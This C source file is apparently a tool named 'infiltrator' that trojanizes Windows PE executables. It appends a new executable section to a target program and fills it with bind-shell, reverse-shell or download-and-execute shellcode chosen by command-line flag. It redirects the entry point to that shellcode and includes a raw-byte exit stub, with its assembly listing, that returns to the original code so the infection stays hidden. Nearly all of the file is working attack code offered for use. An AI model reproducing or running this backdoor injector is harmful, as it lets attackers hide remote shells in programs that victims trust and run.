/*	Refrences:
	http://win32assembly.programminghorizon.com
	http://en.wikibooks.org/wiki/X86_Disassembly/Windows_Executable_Files#MS-DOS_header
	http://www.sunshine2k.de/reversing/tuts/tut_addsec.htm
	http://msdn.microsoft.com/en-us/library/ms809762.aspx
	http://www.codereversing.com/blog/?p=92
	http://www.alex-ionescu.com/part1.pdf

	Credits:
			[*] corelanc0d3r "https://www.corelan.be".
			[*] Sherif El deeb "http://eldeeb.net/wrdprs/".
			[*] Metasploit Team.
			 

	PE Headers:
	IMAGE_DOS_HEADER from windows.h
	typedef struct _IMAGE_DOS_HEADER
{
     WORD e_magic;
     WORD e_cblp;
     WORD e_cp;
     WORD e_crlc;
     WORD e_cparhdr;
     WORD e_minalloc;
     WORD e_maxalloc;
     WORD e_ss;
     WORD e_sp;
     WORD e_csum;
     WORD e_ip;
     WORD e_cs;
     WORD e_lfarlc;
     WORD e_ovno;
     WORD e_res[4];
     WORD e_oemid;
     WORD e_oeminfo;
     WORD e_res2[10];
     LONG e_lfanew;
} IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER;*/

	
	/* IMAGE_NT_HEADERS from winnt.h
	typedef struct _IMAGE_NT_HEADERS {
  DWORD                 Signature;
  IMAGE_FILE_HEADER     FileHeader;
  IMAGE_OPTIONAL_HEADER OptionalHeader;
} IMAGE_NT_HEADERS, *PIMAGE_NT_HEADERS;

typedef struct _IMAGE_FILE_HEADER {
  WORD  Machine;
  WORD  NumberOfSections;
  DWORD TimeDateStamp;
  DWORD PointerToSymbolTable;
  DWORD NumberOfSymbols;
  WORD  SizeOfOptionalHeader;
  WORD  Characteristics;
} IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;
	/* 

typedef struct _IMAGE_OPTIONAL_HEADER {
  WORD                 Magic;
  BYTE                 MajorLinkerVersion;
  BYTE                 MinorLinkerVersion;
  DWORD                SizeOfCode;
  DWORD                SizeOfInitializedData;
  DWORD                SizeOfUninitializedData;
  DWORD                AddressOfEntryPoint;
  DWORD                BaseOfCode;
  DWORD                BaseOfData;
  DWORD                ImageBase;
  DWORD                SectionAlignment;
  DWORD                FileAlignment;
  WORD                 MajorOperatingSystemVersion;
  WORD                 MinorOperatingSystemVersion;
  WORD                 MajorImageVersion;
  WORD                 MinorImageVersion;
  WORD                 MajorSubsystemVersion;
  WORD                 MinorSubsystemVersion;
  DWORD                Win32VersionValue;
  DWORD                SizeOfImage;
  DWORD                SizeOfHeaders;
  DWORD                CheckSum;
  WORD                 Subsystem;
  WORD                 DllCharacteristics;
  DWORD                SizeOfStackReserve;
  DWORD                SizeOfStackCommit;
  DWORD                SizeOfHeapReserve;
  DWORD                SizeOfHeapCommit;
  DWORD                LoaderFlags;
  DWORD                NumberOfRvaAndSizes;
  IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];
} IMAGE_OPTIONAL_HEADER, *PIMAGE_OPTIONAL_HEADER;
typedef struct _IMAGE_SECTION_HEADER {
  BYTE  Name[IMAGE_SIZEOF_SHORT_NAME];
  union {
    DWORD PhysicalAddress;
    DWORD VirtualSize;
  } Misc;
  DWORD VirtualAddress;
  DWORD SizeOfRawData;
  DWORD PointerToRawData;
  DWORD PointerToRelocations;
  DWORD PointerToLinenumbers;
  WORD  NumberOfRelocations;
  WORD  NumberOfLinenumbers;
  DWORD Characteristics;
} IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;

*/


#include <Windows.h>
#include <stdio.h>
#include <winnt.h>
#include <string.h>
#include<G:\infiltrator\infiltrator\infiltrator\payloads.h>

#define max_sections 0xF

DWORD align_to_boundary(unsigned int address,unsigned int boundary) //function to align givven address (IMAGE_SECTION_HEADER[i-1].Virtualsize+IMAGE_SECTION_HEADER[i-1].Misc.VirtualSize) to section alignment (boundary)
{
	return (((address+boundary-1)/boundary)*boundary);
}
unsigned int getfilesize(FILE *fp)
{
	unsigned int size;	
	fseek(fp,0,SEEK_END);	// seek to end of file SEEK_END, SEEK_SET means begining
	size = ftell(fp);		//tells location of pointer size 
	rewind(fp);				// rewind back to beginig of file
	return size;
}
char *readfiletobuffer(FILE *fp,unsigned int size, unsigned int offset,int sizeofrawdata)
{
	char *buffer ;		//pointer to a char
	buffer = (char *)calloc(size+sizeof(IMAGE_SECTION_HEADER)+sizeofrawdata,1);	// calloc returns mem addr to memory allocated, so we let *buffer point to memory addr allocated
	fread(buffer,1,offset,fp);	//fread into memory located at address pointed to by buffer
	return buffer;				// return the memory addr
}
int main(int argc, char *argv[])
{
	FILE *fp, *fp2 ;
	IMAGE_DOS_HEADER idh ;
	IMAGE_NT_HEADERS inth ;
	IMAGE_SECTION_HEADER ish[ max_sections ] = {0} ;
	char *buffer,*newbuffer,*outputfile,*inputfile; 
	unsigned int i,size, offset, offset2, x, end_size, y, count, shellcode_size ;
	IMAGE_SECTION_HEADER *new_ish;
	char *shellcode;


//char shellcode[] = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" //NOP SLED
//"\x60";	//PUSHAD

char exit_stub[] = "\x31\xc0\x64\xa1\x30\x00\x00\x00\x8b\x40\x0c\x8b\x40\x0c\x8b\x40\x18\x05\xff\xee\xdd\xcc\x90\x90\x89\x44\xE4\x1c\x90\x61\x90\x90\x90\x90\xff\xe0";// "\x90\x90" = "\x89\xec" | "\x90" = "\x5D" | "\x9d" popfd removed since it some times insert brakpoint and break execution
/*
exit stub
[BITS 32]

global _start

_start:

xor eax,eax     ; zero out EAX
mov eax,[fs:0x30]       ; get location of PEB	
mov eax,[eax+0xC]       ; PEB->ldr
mov eax,[eax+0xC]       ; PEB->ldr.InloadOrderModuleList
mov eax,[eax+0x18]      ; PEB->ldr.InloadOrderMOduleList.Dllbase
add eax,0xCCDDEEFF      ; this will be replace with the original entry point
mov esp,ebp		; aligining the stack	//changed to NOP
mov [esp+0x20],eax	; put value of eax in esp+0x20 so eax holds the addr after popad and popfd // changed to mov [esp+0x1c],eax
pop ebp				; poping back ebp addr	//NOP
popad				; pop registers
jmp eax				; jmp to addr saved in eax
*/

for (count = 0; count < argc; count++)
{

	if (!strcmp(argv[count],"-k"))
	{
		if (!strcmp(argv[count+1], "bind"))
		{
			shellcode=(CHAR *)calloc(sizeof(bind_shell_threaded),1);
			memcpy(shellcode,bind_shell_threaded,sizeof(bind_shell_threaded));
			shellcode_size = sizeof(bind_shell_threaded);
		}
		if (!strcmp(argv[count+1], "reverse"))
		{
			shellcode=(CHAR *)calloc(sizeof(reverse_shell_threaded),1);
			memcpy(shellcode,reverse_shell_threaded,sizeof(reverse_shell_threaded));
			shellcode_size = sizeof(reverse_shell_threaded);
		}
		if (!strcmp(argv[count+1], "download & execute"))
		{
			printf("[*] there is no need for Download and Execute to be threaded so using normal Shell\n");
			shellcode=(CHAR *)calloc(sizeof(download_execute),1);
			memcpy(shellcode,download_execute,sizeof(download_execute));
			shellcode_size = sizeof(download_execute);
		}
	}
	if (!strcmp(argv[count],"-s"))
	{
		if (!strcmp(argv[count+1], "bind"))
		{
			shellcode=(CHAR *)calloc(sizeof(bind_shell),1);
			memcpy(shellcode,bind_shell,sizeof(bind_shell));
			shellcode_size = sizeof(bind_shell);
		}
		if (!strcmp(argv[count+1], "reverse"))
		{
			shellcode=(CHAR *)calloc(sizeof(reverse_shell),1);
			memcpy(shellcode,reverse_shell,sizeof(reverse_shell));
			shellcode_size = sizeof(reverse_shell);
		}
		if (!strcmp(argv[count+1], "download & execute"))
		{
			shellcode=(CHAR *)calloc(sizeof(download_execute),1);
			memcpy(shellcode,download_execute,sizeof(download_execute));
			shellcode_size = sizeof(download_execute);
		}
	}
	if (!strcmp(argv[count],"-o"))
	{
		outputfile=(char *)calloc(strlen(argv[count+1]),1);
		strcpy(outputfile,argv[count+1]);
	}
	if (!strcmp(argv[count],"-i"))
	{
		inputfile=(char *)calloc(strlen(argv[count+1]),1);
		strcpy(inputfile,argv[count+1]);
	}

}

	new_ish = (IMAGE_SECTION_HEADER *)calloc(sizeof(IMAGE_SECTION_HEADER),1);


	if (! (fp = fopen(inputfile,"rb+"))) //opens file arg 1 , and read it in binary FILE * fopen ( const char * filename, const char * mode );
	{
		printf("Couldn't open file\n");
		return -1;
	}
	else
	{
	    printf("[*] File Open Success\n");
	}
	if (! (fread(&idh,sizeof(IMAGE_DOS_HEADER),1,fp))) //fread from file in mem arg4, and save it in mem addr arg 1 size_t fread ( void * ptr, size_t size, size_t count, FILE * stream );
     {
         printf("Couldn't read File");
     }
     else{
         printf("[*] IMAGE_DOS_HEADERS Read\n");
         }
    if (fseek(fp, idh.e_lfanew, SEEK_SET)) //Sets the position indicator associated with the stream to a new position. to new offset arg 2 arg3 is usually SEEK_SET, int fseek ( FILE * stream, long int offset, int origin );
    {
        printf("Couldn't seek to offset\n");
    }
    else
    {
        printf("[*] File Seek Success\n");
    }
	if (! (fread(&inth,sizeof(IMAGE_NT_HEADERS),1,fp)))
	{
			printf("Couldn't read location");
	}
	else
	{
		printf("[*] IMAGE_NT_HEADERS Read:\n");
	}
	// seek to adress of PE_HEADER + Size OF PE_HEADER (IMAGE_NT_HEADERSs) or image_base + size of headers
	//if (fseek(fp,inth.OptionalHeader.ImageBase + sizeof(IMAGE_DOS_HEADER) + sizeof(IMAGE_NT_HEADERS),SEEK_SET))
	if (fseek(fp,idh.e_lfanew+sizeof(IMAGE_NT_HEADERS),SEEK_SET))
	{
		printf("Couldn't seek to section \n");
	}
	else
	{
		printf("[*] seek to section Success\n");
	}
	for ( i = 0; i < inth.FileHeader.NumberOfSections; i++)
	{
			if(! (fread(&ish[i],sizeof(IMAGE_SECTION_HEADER),1,fp)))
		{
			printf("Couldn't Read IMAGE_SECTION_HEADER%d\n",i+1);
		}
		else
		{
			offset = ftell(fp);
			printf("[*] IMAGE_SECTION_HEADER Section %d Read Success\n", i+1);
			//printf("[*] Current Offset=%d\n",offset);
		}
		

	}
	// fill out our new IMAGE_SECTION_HEADER struct new_ish
	new_ish->Name[0] = 46;
	new_ish->Name[1] = 115;
	new_ish->Name[2] = 97;
	new_ish->Name[3] = 105;
	new_ish->Name[4] = 102;
	new_ish->Misc.PhysicalAddress = 4096;
	new_ish->Misc.VirtualSize = 4096;
	new_ish->SizeOfRawData = 4096;
	new_ish->VirtualAddress = align_to_boundary(ish[i-1].VirtualAddress + ish[i-1].Misc.VirtualSize,inth.OptionalHeader.SectionAlignment);		//round up aligin to section alignment	// Add the virtual size to the virtual address of the reloc section (0x4034) and round up to the next 0x1000 boundary to get 0x5000. This is the virtual address of the added section.
	new_ish->PointerToRawData = ish[i-1].PointerToRawData + ish[i-1].SizeOfRawData;
	new_ish->Characteristics = 3758096608;
	size = getfilesize(fp);	
	printf("[*] Reading First section to memory\n");
	buffer = readfiletobuffer(fp,size,offset,new_ish->SizeOfRawData);
	printf("[*] Adding New Section Header information\n");
	memcpy(buffer+offset,new_ish,sizeof(IMAGE_SECTION_HEADER)); //copy new_ish data to memory located at buffer + offset with size of IMAGE_SECTION_HEADER 
	offset = offset + sizeof(IMAGE_SECTION_HEADER);
	newbuffer = buffer + offset;
	// seek to  PE_HEADER + size of DWORD (IMAGE_SECTION_HEADER.Signature) + size of WORD (IMAGE_NT_HEADERS.IMAGE_FILE_HEADERS.MAchine)
	if ( fseek(fp,idh.e_lfanew +  sizeof(DWORD) +sizeof(WORD),SEEK_SET))
	{
		printf("Couldn't Seek to Number of Sections\n");
	}
	else
	{
		printf("[*] Seek  to NumberOfSections Succesful\n");
		offset2 = ftell(fp);
	}
	//void * memset ( void * ptr, int value, size_t num );
	//Sets the first num bytes of the block of memory pointed by ptr to the specified value (interpreted as an unsigned char).
	// sets the number of sections to number of sections + 1
	memset(buffer+offset2,inth.FileHeader.NumberOfSections+1,1);
	printf("[*] Number of sections incresed to:%d\n",inth.FileHeader.NumberOfSections+1);
	
	//seek to image size in pe header
	if(fseek(fp,idh.e_lfanew+sizeof(DWORD)+sizeof(IMAGE_FILE_HEADER)+sizeof(WORD)+(sizeof(BYTE)*2)+(sizeof(DWORD)*9)+(sizeof(WORD)*6)+sizeof(DWORD),SEEK_SET))
	{
		printf("Couldn't Seek to Image Size\n");
	}
	else
	{
		printf("[*] Seeked to image size offset success\n");
		offset2 = ftell(fp);
	}
	//memset(buffer+offset2, inth.OptionalHeader.SizeOfImage + inth.OptionalHeader.SectionAlignment,sizeof(DWORD));
	x = inth.OptionalHeader.SizeOfImage + inth.OptionalHeader.SectionAlignment; 

//	memcpy(buffer+offset2,&x,sizeof(DWORD));
	__asm			//workaround because memset only write bytes
	{
		PUSH 4		//push number of bytes to overwrite to stack which is sizeof DWORD 4 bytes
		PUSH x	//string to write which is the variable x 
		mov eax,dword ptr [offset2]		// mov data contained in offset2 to eax
		mov ecx,dword ptr [buffer]		// mov data contained in buffer to ecx
		lea edi,[ecx+eax]				// load effective address of [offset2+buffer] to edi
		pop eax							// pop the last string on stack which is 5000h to eax
		stosd							//stores double word in eax into memory location at edi
		pop ecx}						// 2nd pop to adjust ESP to its original value after call data pushed = data poped
		


	printf("[*] increased image size\n");
	if(fseek(fp,idh.e_lfanew + sizeof(IMAGE_NT_HEADERS) + (sizeof(IMAGE_SECTION_HEADER) * (i+1)),SEEK_SET))
	{
		printf("Couldn't seek to rest of file location");
	}
	else
	{
		printf("[*] Seeked to rest of file location successfully\n");
	}
	if(!(fread(newbuffer,1,size-offset-sizeof(IMAGE_SECTION_HEADER),fp))) 
	{
		printf("Couldn't write rest of file to memory\n");
	}
	else
	{
		printf("[*] Loading rest of file to memory\n");
		memcpy(buffer+offset,newbuffer,sizeof(newbuffer));
	}

	fseek(fp,0,SEEK_END);
	end_size = ftell(fp);
	// write shellcode to buffer in memory memcpy to buffer addr + original file size from data located at addr of shellcode size of shellcode
	memcpy(buffer+end_size,shellcode,shellcode_size); //
	printf("[*] Writing shellcode to memory\n");
	//memcpy exit stub to end of shellcode ; -1 for alignment
	memcpy(buffer+end_size+shellcode_size-1,&exit_stub,sizeof(exit_stub));
	//memcpy to overwrite the 0xccddeeff in the original shellcode with our IMAGE_NT_HEADER.IMAGE_OPTIONAL_HEADE.EntryAddress
	memcpy(buffer+end_size+shellcode_size+sizeof(exit_stub)-20, &inth.OptionalHeader.AddressOfEntryPoint,sizeof(DWORD));


	//we need to memset the entry point to our shellcode entry point so address of entry when pe is loaded is actually address of entry + image base
	//PointerToRawData 	The file offset of the beginning of the section. The PE loader uses the value in this field to find where the data in the section is in the file.
	//AddressOfEntryPoint 	It's the RVA of the first instruction that will be executed when the PE loader is ready to run the PE file. If you want to divert the flow of execution right from the start, you need to change the value in this field to a new RVA and the instruction at the new RVA will be executed first.
	// so the new address entry point will be our sections virtual adrress since it is an rva + 10 
	y = new_ish->VirtualAddress;
	memcpy(buffer+idh.e_lfanew+sizeof(DWORD)+sizeof(IMAGE_FILE_HEADER)+sizeof(WORD)+(sizeof(BYTE)*2)+(sizeof(DWORD)*3),&y,sizeof(DWORD));

	// size_t fwrite ( const void * ptr, size_t size, size_t count, FILE * stream ); 
	// write the data pointed to by addr , data size, data count, file stream
	if(! (fp2 = fopen(outputfile,"wb+")))
	{
		printf("Couldn't Open file");
	}
	else
	{
		printf("[*] File Written Succesfully\n");
		fwrite(buffer,size+sizeof(IMAGE_SECTION_HEADER)+new_ish->SizeOfRawData,1,fp2);
	}

	fclose(fp2);
	fclose(fp);
	
}	
